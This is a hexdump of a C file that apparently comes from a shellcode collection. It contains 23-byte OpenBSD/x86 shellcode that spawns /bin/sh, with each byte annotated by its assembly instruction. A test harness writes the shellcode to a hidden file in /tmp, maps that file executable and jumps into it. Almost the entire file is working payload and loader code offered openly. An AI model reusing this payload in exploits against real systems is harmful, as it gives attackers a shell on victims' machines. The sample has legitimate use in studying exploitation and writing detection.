00000000  2f 2a 0d 0a 20 2a 20 5b  4f 70 65 6e 42 53 44 2f  |/*.. * [OpenBSD/|
00000010  78 38 36 5d 0d 0a 20 2a  20 53 68 65 6c 6c 63 6f  |x86].. * Shellco|
00000020  64 65 20 66 6f 72 3a 20  65 78 65 63 76 65 28 22  |de for: execve("|
00000030  2f 62 69 6e 2f 73 68 22  2c 20 5b 22 2f 62 69 6e  |/bin/sh", ["/bin|
00000040  2f 73 68 22 5d 2c 20 4e  55 4c 4c 29 0d 0a 20 2a  |/sh"], NULL).. *|
00000050  20 32 33 20 62 79 74 65  73 0d 0a 20 2a 20 68 6f  | 23 bytes.. * ho|
00000060  70 68 65 74 20 5b 61 74  5d 20 67 6d 61 69 6c 2e  |phet [at] gmail.|
00000070  63 6f 6d 0d 0a 20 2a 20  68 74 74 70 3a 2f 2f 77  |com.. * http://w|
00000080  77 77 2e 6e 6c 61 62 73  2e 63 6f 6d 2e 62 72 2f  |ww.nlabs.com.br/|
00000090  7e 68 6f 70 68 65 74 2f  0d 0a 20 2a 0d 0a 20 2a  |~hophet/.. *.. *|
000000a0  20 46 61 6e 63 79 20 6d  61 70 70 69 6e 67 73 20  | Fancy mappings |
000000b0  62 79 20 69 72 75 61 74  61 20 73 6f 75 7a 61 20  |by iruata souza |
000000c0  28 6d 75 7a 67 6f 29 0d  0a 20 2a 20 69 72 75 2e  |(muzgo).. * iru.|
000000d0  6d 75 7a 67 6f 21 67 6d  61 69 6c 2e 63 6f 6d 0d  |muzgo!gmail.com.|
000000e0  0a 20 2a 20 68 74 74 70  3a 2f 2f 6f 70 65 6e 76  |. * http://openv|
000000f0  6d 73 2d 72 6f 63 6b 73  2e 63 6f 6d 2f 7e 6d 75  |ms-rocks.com/~mu|
00000100  7a 67 6f 2f 0d 0a 20 2a  2f 0d 0a 0d 0a 23 69 6e  |zgo/.. */....#in|
00000110  63 6c 75 64 65 20 3c 73  79 73 2f 74 79 70 65 73  |clude <sys/types|
00000120  2e 68 3e 0d 0a 23 69 6e  63 6c 75 64 65 20 3c 73  |.h>..#include <s|
00000130  79 73 2f 73 74 61 74 2e  68 3e 0d 0a 23 69 6e 63  |ys/stat.h>..#inc|
00000140  6c 75 64 65 20 3c 73 79  73 2f 6d 6d 61 6e 2e 68  |lude <sys/mman.h|
00000150  3e 0d 0a 0d 0a 23 69 6e  63 6c 75 64 65 20 3c 65  |>....#include <e|
00000160  72 72 2e 68 3e 0d 0a 23  69 6e 63 6c 75 64 65 20  |rr.h>..#include |
00000170  3c 66 63 6e 74 6c 2e 68  3e 0d 0a 23 69 6e 63 6c  |<fcntl.h>..#incl|
00000180  75 64 65 20 3c 73 74 64  69 6f 2e 68 3e 0d 0a 23  |ude <stdio.h>..#|
00000190  69 6e 63 6c 75 64 65 20  3c 73 74 72 69 6e 67 2e  |include <string.|
000001a0  68 3e 0d 0a 23 69 6e 63  6c 75 64 65 20 3c 75 6e  |h>..#include <un|
000001b0  69 73 74 64 2e 68 3e 0d  0a 20 0d 0a 63 68 61 72  |istd.h>.. ..char|
000001c0  20 73 68 65 6c 6c 63 6f  64 65 5b 5d 20 3d 0d 0a  | shellcode[] =..|
000001d0  0d 0a 22 5c 78 39 39 22  09 09 09 09 09 2f 2a 20  |.."\x99"...../* |
000001e0  63 6c 74 64 20 2a 2f 0d  0a 22 5c 78 35 32 22 09  |cltd */.."\x52".|
000001f0  09 09 09 09 2f 2a 20 70  75 73 68 09 25 65 64 78  |..../* push.%edx|
00000200  20 2a 2f 0d 0a 22 5c 78  36 38 5c 78 36 65 5c 78  | */.."\x68\x6e\x|
00000210  32 66 5c 78 37 33 5c 78  36 38 22 09 09 09 2f 2a  |2f\x73\x68".../*|
00000220  20 70 75 73 68 09 24 30  78 36 38 37 33 32 66 36  | push.$0x68732f6|
00000230  65 20 2a 2f 0d 0a 22 5c  78 36 38 5c 78 32 66 5c  |e */.."\x68\x2f\|
00000240  78 32 66 5c 78 36 32 5c  78 36 39 22 09 09 09 2f  |x2f\x62\x69".../|
00000250  2a 20 70 75 73 68 09 24  30 78 36 39 36 32 32 66  |* push.$0x69622f|
00000260  32 66 20 2a 2f 0d 0a 22  5c 78 38 39 5c 78 65 33  |2f */.."\x89\xe3|
00000270  22 09 09 09 09 2f 2a 20  6d 6f 76 09 25 65 73 70  |"..../* mov.%esp|
00000280  2c 25 65 62 78 20 2a 2f  0d 0a 22 5c 78 35 32 22  |,%ebx */.."\x52"|
00000290  09 09 09 09 09 2f 2a 20  70 75 73 68 09 25 65 64  |...../* push.%ed|
000002a0  78 20 2a 2f 0d 0a 22 5c  78 35 34 22 09 09 09 09  |x */.."\x54"....|
000002b0  09 2f 2a 20 70 75 73 68  09 25 65 73 70 20 2a 2f  |./* push.%esp */|
000002c0  0d 0a 22 5c 78 35 33 22  20 20 20 20 20 20 20 20  |.."\x53"        |
000002d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002e0  20 20 09 2f 2a 20 70 75  73 68 09 25 65 62 78 20  |  ./* push.%ebx |
000002f0  2a 2f 0d 0a 22 5c 78 35  33 22 09 09 09 09 09 2f  |*/.."\x53"...../|
00000300  2a 20 70 75 73 68 09 25  65 62 78 20 2a 2f 0d 0a  |* push.%ebx */..|
00000310  22 5c 78 36 61 5c 78 33  62 22 09 09 09 09 2f 2a  |"\x6a\x3b"..../*|
00000320  20 70 75 73 68 09 24 30  78 33 62 20 2a 2f 0d 0a  | push.$0x3b */..|
00000330  22 5c 78 35 38 22 09 09  09 09 09 2f 2a 20 70 6f  |"\x58"...../* po|
00000340  70 09 25 65 61 78 20 2a  2f 0d 0a 22 5c 78 63 64  |p.%eax */.."\xcd|
00000350  5c 78 38 30 22 3b 09 09  09 09 2f 2a 20 69 6e 74  |\x80";..../* int|
00000360  09 24 30 78 38 30 20 2a  2f 0d 0a 0d 0a 2f 2a 0d  |.$0x80 */..../*.|
00000370  0a 20 2a 20 53 69 6e 63  65 20 73 68 65 6c 6c 63  |. * Since shellc|
00000380  6f 64 65 20 61 62 6f 76  65 20 77 69 6c 6c 20 62  |ode above will b|
00000390  65 20 6d 61 70 70 65 64  20 69 6e 20 2e 72 6f 64  |e mapped in .rod|
000003a0  61 74 61 20 28 72 65 61  64 2d 6f 6e 6c 79 20 70  |ata (read-only p|
000003b0  72 6f 74 65 63 74 69 6f  6e 29 2c 0d 0a 20 2a 20  |rotection),.. * |
000003c0  77 65 20 6e 65 65 64 20  74 6f 20 77 72 69 74 65  |we need to write|
000003d0  20 69 74 20 74 6f 20 61  20 66 69 6c 65 20 61 6e  | it to a file an|
000003e0  64 20 6d 61 70 20 74 68  65 20 66 69 6c 65 20 77  |d map the file w|
000003f0  69 74 68 20 50 52 4f 54  5f 45 58 45 43 20 69 6e  |ith PROT_EXEC in|
00000400  20 6f 72 64 65 72 0d 0a  20 2a 20 74 6f 20 65 78  | order.. * to ex|
00000410  65 63 75 74 65 20 69 74  2e 0d 0a 20 2a 2f 0d 0a  |ecute it... */..|
00000420  0d 0a 69 6e 74 20 6d 61  69 6e 28 76 6f 69 64 29  |..int main(void)|
00000430  0d 0a 7b 0d 0a 20 20 20  20 20 20 20 20 76 6f 69  |..{..        voi|
00000440  64 20 28 2a 70 29 28 29  3b 0d 0a 09 69 6e 74 20  |d (*p)();...int |
00000450  66 64 3b 0d 0a 09 0d 0a  09 66 64 3d 6f 70 65 6e  |fd;......fd=open|
00000460  28 22 2f 74 6d 70 2f 2e  20 22 2c 20 4f 5f 52 44  |("/tmp/. ", O_RD|
00000470  57 52 7c 4f 5f 43 52 45  41 54 2c 20 53 5f 49 52  |WR|O_CREAT, S_IR|
00000480  55 53 52 7c 53 5f 49 57  55 53 52 29 3b 0d 0a 09  |USR|S_IWUSR);...|
00000490  69 66 28 66 64 20 3c 20  30 29 0d 0a 09 09 65 72  |if(fd < 0)....er|
000004a0  72 28 31 2c 20 22 6f 70  65 6e 22 29 3b 0d 0a 09  |r(1, "open");...|
000004b0  0d 0a 09 77 72 69 74 65  28 66 64 2c 20 73 68 65  |...write(fd, she|
000004c0  6c 6c 63 6f 64 65 2c 20  73 74 72 6c 65 6e 28 73  |llcode, strlen(s|
000004d0  68 65 6c 6c 63 6f 64 65  29 29 3b 0d 0a 09 69 66  |hellcode));...if|
000004e0  28 28 6c 73 65 65 6b 28  66 64 2c 20 30 4c 2c 20  |((lseek(fd, 0L, |
000004f0  53 45 45 4b 5f 53 45 54  29 29 20 3c 20 30 29 0d  |SEEK_SET)) < 0).|
00000500  0a 09 09 65 72 72 28 31  2c 20 22 6c 73 65 65 6b  |...err(1, "lseek|
00000510  22 29 3b 0d 0a 0d 0a 09  70 20 3d 20 28 76 6f 69  |");.....p = (voi|
00000520  64 20 28 2a 29 28 29 29  6d 6d 61 70 28 4e 55 4c  |d (*)())mmap(NUL|
00000530  4c 2c 20 73 74 72 6c 65  6e 28 73 68 65 6c 6c 63  |L, strlen(shellc|
00000540  6f 64 65 29 2c 20 50 52  4f 54 5f 52 45 41 44 7c  |ode), PROT_READ||
00000550  50 52 4f 54 5f 45 58 45  43 2c 20 4e 55 4c 4c 2c  |PROT_EXEC, NULL,|
00000560  20 66 64 2c 20 4e 55 4c  4c 29 3b 0d 0a 09 69 66  | fd, NULL);...if|
00000570  20 28 70 20 3d 3d 20 28  76 6f 69 64 20 28 2a 29  | (p == (void (*)|
00000580  28 29 29 4d 41 50 5f 46  41 49 4c 45 44 29 0d 0a  |())MAP_FAILED)..|
00000590  09 09 65 72 72 28 31 2c  20 22 6d 6d 61 70 22 29  |..err(1, "mmap")|
000005a0  3b 0d 0a 09 70 28 29 3b  0d 0a 09 72 65 74 75 72  |;...p();...retur|
000005b0  6e 20 30 3b 0d 0a 7d                              |n 0;..}|
000005b7
